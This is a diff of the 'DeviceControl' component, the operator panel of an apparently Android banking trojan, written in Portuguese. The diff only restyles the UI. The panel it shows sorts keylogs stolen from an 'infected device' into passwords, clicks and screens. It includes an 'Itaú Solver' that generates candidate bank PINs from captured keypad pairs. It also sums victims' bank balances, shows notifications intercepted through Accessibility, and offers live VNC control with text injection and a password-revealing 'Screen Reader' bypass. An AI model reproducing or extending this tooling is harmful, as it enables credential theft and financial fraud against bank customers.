-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
-                                        🔑 Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
+                                         Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                       </button>
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('click')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'click'
-                                            ? 'bg-purple-500/20 text-purple-300 border-purple-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
-                                        👆 Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
+                                         Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                       </button>
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('screen')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'screen'
-                                            ? 'bg-blue-500/20 text-blue-300 border-blue-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                          Telas Aberta ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
@@ -7274,24 +7338,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('text')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'text'
                                             ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/50 shadow-[0_0_8px_rgba(16,185,129,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                         ¨ Textos ({appKeylogs.filter(l => getLogCategory(l) === 'text').length})
                                       </button>
                                     </div>
 
-                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-slate-800/60">
+                                    <div className="space-y-4 max-h-72 overflow-y-auto pr-1 custom-scrollbar relative pl-3 border-l border-[#24242a]/60">
                                       {Object.keys(groups).map((day, groupIdx) => (
                                         <div key={groupIdx} className="space-y-2 relative">
                                           {/* Badge de Data com Copiar Tudo */}
                                           <div className="flex items-center justify-between my-2 relative -left-4">
-                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-slate-800 shadow-md">
-                                              <span className="text-[10px]">📅</span>
-                                              <span className="text-[9px] font-black font-mono text-cyan-400 uppercase tracking-wide">
+                                            <div className="flex items-center gap-1.5 bg-slate-950 px-2 py-0.5 rounded-full border border-[#24242a] shadow-md">
+                                              <span className="text-[10px]"></span>
+                                              <span className="text-[9px] font-black font-mono text-[#ef4444] uppercase tracking-wide">
                                                 {day}
                                               </span>
                                             </div>
@@ -7302,9 +7366,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                   return `[${time}] ${getBankLogDisplay(l)}`;
                                                 }).join('\n');
                                                 navigator.clipboard.writeText(textToCopy);
-                                                addLog(`📋 Copiado todos os logs de ${day}`);
+                                                addLog(` Copiado todos os logs de ${day}`);
                                               }}
-                                              className="text-[8px] font-bold text-slate-500 hover:text-cyan-400 bg-slate-950/40 hover:bg-cyan-950/20 px-2 py-0.5 rounded border border-slate-900 hover:border-cyan-800/40 transition-all font-mono"
+                                              className="text-[8px] font-bold text-[#8b8b94] hover:text-[#ef4444] bg-slate-950/40 hover:bg-[#121214]/20 px-2 py-0.5 rounded border border-[#121214] hover:border-[#24242a]/40 transition-all font-mono"
                                             >
                                               Copiar Dia
                                             </button>
@@ -7322,7 +7386,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                               const isScreen = category === 'screen';
                                               const isText = category === 'text';
 
-                                              // Verifica se parece um PIN ou senha do🏦 Itaú
+                                              // Verifica se parece um PIN ou senha do Itaú
                                               const isItauKeypad = /(\d)\s*(?:ou|\|)\s*(\d)/i.test(logText);
                                               let itauPairs: [string, string][] = [];
                                               let itauPermutations: string[] = [];
@@ -7346,47 +7410,47 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                               return (
                                                 <div 
                                                   key={log.id || logIdx} 
-                                                  className={`group flex items-start gap-2.5 p-2 rounded-xl transition-all border ${
+                                                  className={`group flex items-start gap-2.5 p-2 rounded-md transition-all border ${
                                                     isPass 
-                                                      ? 'bg-rose-950/20 border-rose-900/50 hover:border-rose-500/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
+                                                      ? 'bg-rose-950/20 border-[#1a1a1e]/50 hover:border-[#ef4444]/60 shadow-[0_0_10px_rgba(244,63,94,0.1)]' 
                                                       : isClick 
-                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-purple-500/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
+                                                        ? 'bg-purple-950/20 border-purple-900/50 hover:border-[#f87171]/60 shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                                                         : isScreen 
-                                                          ? 'bg-cyan-950/15 border-cyan-900/40 hover:border-cyan-500/40'
-                                                          : 'bg-[#200703]/40 border-slate-900/50 hover:border-slate-800/60'
+                                                          ? 'bg-[#121214]/15 border-[#1a1a1e]/40 hover:border-[#2a2a31]/40'
+                                                          : 'bg-[#200703]/40 border-[#121214]/50 hover:border-[#24242a]/60'
                                                   }`}
                                                 >
                                                   {/* Indicador de linha do tempo */}
                                                   <div className="flex flex-col items-center flex-shrink-0 pt-1 relative -left-[18px]">
                                                     <div className={`w-2.5 h-2.5 rounded-full border-2 bg-slate-950 transition-all duration-300 ${
                                                       isPass 
-                                                        ? 'border-rose-500 shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
+                                                        ? 'border-[#ef4444] shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
                                                         : isClick 
-                                                          ? 'border-purple-500 shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
+                                                          ? 'border-[#f87171] shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
                                                           : isOffline 
                                                             ? 'border-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.6)] group-hover:scale-110' 
-                                                            : 'border-cyan-500 shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
+                                                            : 'border-[#2a2a31] shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
                                                     }`}></div>
                                                   </div>
                                                   
                                                   <div className="flex-1 min-w-0 -ml-4">
                                                     <div className="flex items-center justify-between gap-2 mb-1">
                                                       <div className="flex items-center gap-1.5 flex-wrap">
-                                                        <span className="text-[9px] font-mono text-slate-500 font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-slate-900/50">
+                                                        <span className="text-[9px] font-mono text-[#8b8b94] font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-[#121214]/50">
                                                           {logTime}
                                                         </span>
                                                         {isPass && (
-                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-rose-500/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
-                                                            🔑 Teclado / Senha
+                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-[#ef4444]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
+                                                             Teclado / Senha
                                                           </span>
                                                         )}
                                                         {isClick && (
-                                                          <span className="text-[8px] bg-purple-950/60 text-purple-300 border border-purple-500/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
-                                                            👆 Clique em Botão
+                                                          <span className="text-[8px] bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
+                                                             Clique em Botão
                                                           </span>
                                                         )}
                                                         {isScreen && (
-                                                          <span className="text-[8px] bg-cyan-950/60 text-cyan-300 border border-cyan-500/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
+                                                          <span className="text-[8px] bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                              Mudança de Tela
                                                           </span>
                                                         )}
@@ -7397,7 +7461,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                         )}
                                                         {isOffline && (
                                                           <span className="text-[8px] bg-amber-950/40 text-amber-500 border border-amber-500/20 px-1 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
-                                                            📴 Offline
+                                                             Offline
                                                           </span>
                                                         )}
                                                       </div>
@@ -7406,9 +7470,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                       <button
                                                         onClick={() => {
                                                           navigator.clipboard.writeText(logText);
-                                                          addLog(`📋 Copiado: ${logText}`);
+                                                          addLog(` Copiado: ${logText}`);
                                                         }}
-                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-cyan-950/30 text-slate-400 hover:text-cyan-400 border border-slate-900 hover:border-cyan-800/40 px-1.5 py-0.5 rounded transition-all font-mono"
+                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-[#121214]/30 text-slate-400 hover:text-[#ef4444] border border-[#121214] hover:border-[#24242a]/40 px-1.5 py-0.5 rounded transition-all font-mono"
                                                       >
                                                         Copiar
                                                       </button>
@@ -7416,10 +7480,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                     
                                                     {isItauKeypad && itauPairs.length > 0 ? (
                                                       <div className="space-y-2 mt-1">
-                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-lg border border-orange-500/20">
+                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-md border border-[#ef4444]/20">
                                                           {itauPairs.map((pair, idx) => (
-                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-orange-300 border border-orange-500/40 px-2 py-0.5 rounded-md shadow-sm">
-                                                              <span className="text-[9px] text-orange-500/80">T{idx+1}:</span>
+                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-[#fca5a5] border border-[#ef4444]/40 px-2 py-0.5 rounded-md shadow-sm">
+                                                              <span className="text-[9px] text-[#ef4444]/80">T{idx+1}:</span>
                                                               <span>[{pair[0]} ou {pair[1]}]</span>
                                                             </span>
                                                           ))}
@@ -7427,26 +7491,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                                                         {itauPermutations.length > 0 && (
                                                           <details className="group/details">
-                                                            <summary className="cursor-pointer text-[10px] font-bold text-orange-400 hover:text-orange-300 flex items-center justify-between bg-orange-950/40 hover:bg-orange-900/40 px-2.5 py-1 rounded border border-orange-500/30 transition-all select-none">
-                                                              <span>⚡ Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
+                                                            <summary className="cursor-pointer text-[10px] font-bold text-[#f87171] hover:text-[#fca5a5] flex items-center justify-between bg-orange-950/40 hover:bg-[#1a1a1e]/40 px-2.5 py-1 rounded border border-[#ef4444]/30 transition-all select-none">
+                                                              <span> Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
                                                               <button
                                                                 type="button"
                                                                 onClick={(e) => {
                                                                   e.preventDefault();
                                                                   e.stopPropagation();
                                                                   navigator.clipboard.writeText(itauPermutations.join('\n'));
-                                                                  addLog(`📋 Copiado ${itauPermutations.length} senhas🏦 Itaú geradas!`);
+                                                                  addLog(` Copiado ${itauPermutations.length} senhas Itaú geradas!`);
                                                                 }}
-                                                                className="ml-2 text-[9px] bg-orange-500 hover:bg-orange-400 text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
+                                                                className="ml-2 text-[9px] bg-[#ef4444] hover:bg-[#f87171] text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
                                                               >
                                                                 Copiar {itauPermutations.length} Senhas
                                                               </button>
                                                             </summary>
-                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-lg border border-slate-800 font-mono text-[10px] text-orange-300 custom-scrollbar select-all">
+                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-md border border-[#24242a] font-mono text-[10px] text-[#fca5a5] custom-scrollbar select-all">
                                                               {itauPermutations.map((pinCombo, pIdx) => (
-                                                                <div key={pIdx} className="bg-orange-950/30 border border-orange-500/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-orange-500 hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
+                                                                <div key={pIdx} className="bg-orange-950/30 border border-[#ef4444]/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-[#ef4444] hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
                                                                   navigator.clipboard.writeText(pinCombo);
-                                                                  addLog(`📋 Copiado PIN🏦 Itaú: ${pinCombo}`);
+                                                                  addLog(` Copiado PIN Itaú: ${pinCombo}`);
                                                                 }}>
                                                                   {pinCombo}
                                                                 </div>
@@ -7456,14 +7520,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                         )}
                                                       </div>
                                                     ) : (
-                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-lg border shadow-inner ${
+                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-md border shadow-inner ${
                                                         isPass 
-                                                          ? 'text-rose-200 bg-rose-950/30 border-rose-900/50 font-bold' 
+                                                          ? 'text-rose-200 bg-rose-950/30 border-[#1a1a1e]/50 font-bold' 
                                                           : isClick 
                                                             ? 'text-purple-200 bg-purple-950/30 border-purple-900/50 font-semibold'
                                                             : isScreen 
-                                                              ? 'text-cyan-200 bg-cyan-950/20 border-cyan-900/30' 
-                                                              : 'text-slate-100 bg-black/40 border-slate-900/80'
+                                                              ? 'text-[#e8e8ea] bg-[#121214]/20 border-[#1a1a1e]/30' 
+                                                              : 'text-slate-100 bg-black/40 border-[#121214]/80'
                                                       }`}>
                                                         {logText}
                                                       </p>
@@ -7499,9 +7563,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                     return (
                       <div className="space-y-6">
-                        <div className="bg-gradient-to-br from-slate-900 to-slate-950 p-5 rounded-2xl border border-slate-800 shadow-xl">
-                          <h3 className="text-sm font-bold text-slate-200 mb-1">💰 Saldo Total Detectado</h3>
-                          <p className="text-xs text-slate-500">
+                        <div className="bg-gradient-to-br from-[#121214] to-slate-950 p-5 rounded-md border border-[#24242a] shadow-xl">
+                          <h3 className="text-sm font-bold text-slate-200 mb-1"> Saldo Total Detectado</h3>
+                          <p className="text-xs text-[#8b8b94]">
                             Soma dos saldos mais recentes de todos os bancos capturados no aparelho.
                           </p>
                         </div>
@@ -7510,10 +7574,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         <div className="space-y-3">
                           <h4 className="text-xs font-bold text-slate-450 uppercase tracking-wider">Contas Bancárias Monitoradas</h4>
                           {latestBals.length === 0 ? (
-                            <div className="text-center py-10 bg-slate-900/30 border border-dashed border-slate-800 rounded-xl">
+                            <div className="text-center py-10 bg-[#121214]/30 border border-dashed border-[#24242a] rounded-md">
                               <span className="text-4xl block mb-2 opacity-50"></span>
                               <p className="text-slate-400 text-xs font-bold">Nenhum saldo capturado ainda</p>
-                              <p className="text-slate-600 text-[10px] mt-1 max-w-[240px] mx-auto">
+                              <p className="text-[#6f6f78] text-[10px] mt-1 max-w-[240px] mx-auto">
                                 Abra um aplicativo de banco no dispositivo infectado. O monitor capturará o saldo automaticamente.
                               </p>
                             </div>
@@ -7529,7 +7593,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   <div 
                                     key={idx}
                                     onClick={() => setSelectedMonitorBank(matchedInstalled || { package: bal.package, name: displayName })}
-                                    className={`relative overflow-hidden cursor-pointer rounded-xl bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
+                                    className={`relative overflow-hidden cursor-pointer rounded-md bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
                                   >
                                     <div className="flex justify-between items-start mb-4">
                                       <div className="flex items-center space-x-2">
@@ -7559,15 +7623,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               </div>
             ) : showNotificationsTab ? (
-              <div className="bg-[#2b0903]/80 border border-blue-500/20 rounded-2xl flex flex-col text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
-                <div className="p-4 bg-slate-900/60 border-b border-cyan-500/10 flex items-center justify-between flex-shrink-0">
+              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
+                <div className="p-4 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                   <div className="flex items-center space-x-2">
-                    <span className="text-xl">🔔</span>
+                    <span className="text-xl"></span>
                     <div>
-                      <h3 className="text-sm font-black uppercase text-cyan-400 tracking-wider">
+                      <h3 className="text-sm font-black uppercase text-[#ef4444] tracking-wider">
                         Notificações e Mensagens dos Aparelhos
                       </h3>
-                      <p className="text-[10px] text-slate-500">
+                      <p className="text-[10px] text-[#8b8b94]">
                         Mensagens interceptadas em tempo real via Acessibilidade
                       </p>
                     </div>
@@ -7575,7 +7639,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     onClick={fetchNotifications}
                     disabled={isLoadingNotifications}
-                    className="px-3 py-1.5 bg-cyan-950 hover:bg-cyan-900 border border-cyan-500/30 text-cyan-300 text-xs font-bold rounded transition-all flex items-center gap-1.5"
+                    className="px-3 py-1.5 bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] text-xs font-bold rounded transition-all flex items-center gap-1.5"
                   >
                     <RefreshCw className={`w-3.5 h-3.5 ${isLoadingNotifications ? 'animate-spin' : ''}`} />
                     Atualizar
@@ -7584,10 +7648,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 
                 <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-[#200603]">
                   {notifications.length === 0 ? (
-                    <div className="flex flex-col items-center justify-center h-full text-slate-500 py-20">
-                      <span className="text-5xl mb-4 animate-pulse">📭</span>
+                    <div className="flex flex-col items-center justify-center h-full text-[#8b8b94] py-20">
+                      <span className="text-5xl mb-4 animate-pulse"></span>
                       <h4 className="text-sm font-bold text-white">Nenhuma notificação capturada</h4>
-                      <p className="text-xs text-slate-500 text-center mt-1 max-w-[320px]">
+                      <p className="text-xs text-[#8b8b94] text-center mt-1 max-w-[320px]">
                         As notificações recebidas pelo aparelho aparecerão aqui quando forem interceptadas.
                       </p>
                     </div>
@@ -7604,18 +7668,18 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         return (
                           <div 
                             key={notif.id}
-                            className="p-3 bg-slate-900/40 hover:bg-slate-900/70 border border-slate-800/80 rounded-xl flex items-start space-x-3 transition-all"
+                            className="p-3 bg-[#121214]/40 hover:bg-[#121214]/70 border border-[#24242a]/80 rounded-md flex items-start space-x-3 transition-all"
                           >
-                            <div className="flex-shrink-0 w-8 h-8 rounded-lg flex items-center justify-center font-bold text-xs" style={{ background: brand?.bg || 'linear-gradient(135deg,#ef4444,#b91c1c)', color: brand?.text || '#fff' }}>
+                            <div className="flex-shrink-0 w-8 h-8 rounded-md flex items-center justify-center font-bold text-xs" style={{ background: brand?.bg || 'linear-gradient(135deg,#ef4444,#b91c1c)', color: brand?.text || '#fff' }}>
                               {brand?.label || notif.package.substring(0, 3).toUpperCase()}
                             </div>
                             <div className="flex-1 min-w-0">
                               <div className="flex items-center justify-between">
                                 <span className="text-xs font-bold text-slate-300 truncate">{notif.appName || notif.package}</span>
-                                <span className="text-[10px] text-slate-500 font-mono flex-shrink-0 ml-2">{dateFormatted}</span>
+                                <span className="text-[10px] text-[#8b8b94] font-mono flex-shrink-0 ml-2">{dateFormatted}</span>
                               </div>
                               <p className="text-sm text-white font-medium mt-1 leading-relaxed break-words">{notif.text}</p>
-                              <span className="text-[9px] text-slate-600 font-mono block mt-1">{notif.package}</span>
+                              <span className="text-[9px] text-[#6f6f78] font-mono block mt-1">{notif.package}</span>
                             </div>
                           </div>
                         );
@@ -7626,20 +7690,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
             ) : showCombinedVncV2 ? (
               <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 w-full items-stretch justify-center px-1 py-1">
-                {/* 📺 TRANSMISSÃO VNC (ESQUERDA) */}
-                <div id="tour-vnc-stream" className="w-full bg-[#290903]/95 border border-cyan-500/40 backdrop-blur-2xl rounded-2xl p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col items-center justify-between">
-                  <div className="w-full flex items-center justify-between pb-3 border-b border-cyan-500/25 mb-3">
+                {/*  TRANSMISSÃO VNC (ESQUERDA) */}
+                <div id="tour-vnc-stream" className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col items-center justify-between">
+                  <div className="w-full flex items-center justify-between pb-3 border-b border-[#2a2a31]/25 mb-3">
                     <div className="flex items-center space-x-2.5">
-                      <div className="p-2 bg-blue-500/20 rounded-xl border border-blue-400/30">
-                        <span className="text-base">📺</span>
+                      <div className="p-2 bg-[#ef4444]/20 rounded-md border border-[#3a3a44]/30">
+                        <span className="text-base"></span>
                       </div>
                       <div>
                         <h4 className="text-white font-black text-sm font-mono tracking-wide">Transmissão VNC</h4>
-                        <p className="text-[10px] text-cyan-300/70 font-mono">Vídeo Direto em Tempo Real</p>
+                        <p className="text-[10px] text-[#ef4444]/70 font-mono">Vídeo Direto em Tempo Real</p>
                       </div>
                     </div>
-                    <span className="text-[10px] font-mono font-bold bg-cyan-950/90 text-cyan-300 border border-cyan-500/40 px-3 py-1 rounded-xl animate-pulse shadow-[0_0_10px_rgba(239,68,68,0.3)]">
-                      🟢 AO VIVO
+                    <span className="text-[10px] font-mono font-bold bg-[#121214]/90 text-[#ef4444] border border-[#2a2a31]/40 px-3 py-1 rounded-md animate-pulse shadow-[0_0_10px_rgba(239,68,68,0.3)]">
+                       AO VIVO
                     </span>
                   </div>
 
@@ -7658,10 +7722,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         </div>
                       </div>
                     ) : (
-                      <div className="text-center p-8 bg-slate-950/80 rounded-2xl border border-cyan-500/20 w-full max-w-[340px]">
-                        <div className="text-5xl mb-3 animate-bounce">📺</div>
-                        <p className="text-cyan-300 text-sm font-bold mb-4">Captura VNC Desativada</p>
-                        <button onClick={toggleCapture} className="px-5 py-2.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-bold rounded-xl text-xs shadow-lg">
+                      <div className="text-center p-8 bg-slate-950/80 rounded-md border border-[#2a2a31]/20 w-full max-w-[340px]">
+                        <div className="text-5xl mb-3 animate-bounce"></div>
+                        <p className="text-[#ef4444] text-sm font-bold mb-4">Captura VNC Desativada</p>
+                        <button onClick={toggleCapture} className="px-5 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-xs shadow-lg">
                           Iniciar Captura
                         </button>
                       </div>
@@ -7669,7 +7733,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   </div>
 
                   {/* Teclado Rápido Integrado */}
-                  <div className="w-full mt-3 bg-[#170403]/90 border border-cyan-500/30 rounded-xl p-3 shadow-inner">
+                  <div className="w-full mt-3 bg-[#170403]/90 border border-[#2a2a31]/30 rounded-md p-3 shadow-inner">
                     <div className="flex items-center gap-2">
                       <input
                         type="text"
@@ -7677,12 +7741,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         onChange={(e) => setTextToSend(e.target.value)}
                         onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                         placeholder="Digite para enviar texto rápido ao aparelho..."
-                        className="flex-1 px-3.5 py-2 bg-[#02040a] border border-cyan-500/30 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-400 text-xs font-mono"
+                        className="flex-1 px-3.5 py-2 bg-[#0a0202] border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] text-xs font-mono"
                       />
                       <button
                         onClick={handleSendText}
                         disabled={!textToSend.trim()}
-                        className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 disabled:from-slate-800 disabled:text-slate-600 text-white rounded-xl font-bold text-xs uppercase tracking-wider font-mono shadow-md whitespace-nowrap"
+                        className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:from-[#24242a] disabled:text-[#6f6f78] text-[#10120a] rounded-md font-bold text-xs uppercase tracking-wider font-mono shadow-md whitespace-nowrap"
                       >
                         Enviar
                       </button>
@@ -7691,21 +7755,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
 
                 {/* SCREEN READER V2 (DIREITA) */}
-                <div id="tour-screen-reader" className="w-full bg-[#290903]/95 border border-cyan-500/40 backdrop-blur-2xl rounded-2xl p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col justify-between">
+                <div id="tour-screen-reader" className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_35px_rgba(239,68,68,0.2)] flex flex-col justify-between">
                   {/* Header Tático V2 */}
-                  <div className="w-full flex items-center justify-between pb-3 border-b border-cyan-500/25 mb-3">
+                  <div className="w-full flex items-center justify-between pb-3 border-b border-[#2a2a31]/25 mb-3">
                     <div className="flex items-center space-x-2.5">
-                      <div className="p-2 bg-cyan-500/20 rounded-xl border border-cyan-400/30">
-                        <Eye className="w-5 h-5 text-cyan-400 animate-pulse" />
+                      <div className="p-2 bg-[#ef4444]/20 rounded-md border border-[#3a3a44]/30">
+                        <Eye className="w-5 h-5 text-[#ef4444] animate-pulse" />
                       </div>
                       <div>
                         <h4 className="text-white font-black text-sm font-mono tracking-wide">Screen Reader V2</h4>
-                        <p className="text-[10px] text-cyan-300/70 font-mono">Leitura de rvore & Bypass Tático</p>
+                        <p className="text-[10px] text-[#ef4444]/70 font-mono">Leitura de rvore & Bypass Tático</p>
                       </div>
                     </div>
                     {isScreenReaderEnabled && (
-                      <span className="text-[10px] font-mono font-bold bg-amber-950/90 text-amber-300 border border-amber-500/40 px-3 py-1 rounded-xl shadow-[0_0_10px_rgba(245,158,11,0.2)]">
-                        🔒 Senhas Visíveis
+                      <span className="text-[10px] font-mono font-bold bg-amber-950/90 text-amber-300 border border-amber-500/40 px-3 py-1 rounded-md shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                         Senhas Visíveis
                       </span>
                     )}
                   </div>
@@ -7713,16 +7777,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   {/* TELA DA V2 GIGANTE (EXACTAMENTE IGUAL AO VNC AO LADO) */}
                   <div className="w-full flex-1 flex flex-col items-center justify-center min-h-[720px] py-1">
                     {!isScreenReaderEnabled ? (
-                      <div className="text-center p-8 bg-slate-950/80 rounded-2xl border border-cyan-500/20 w-full max-w-[360px]">
-                        <Eye className="w-10 h-10 text-cyan-400 mx-auto mb-3 animate-pulse" />
+                      <div className="text-center p-8 bg-slate-950/80 rounded-md border border-[#2a2a31]/20 w-full max-w-[360px]">
+                        <Eye className="w-10 h-10 text-[#ef4444] mx-auto mb-3 animate-pulse" />
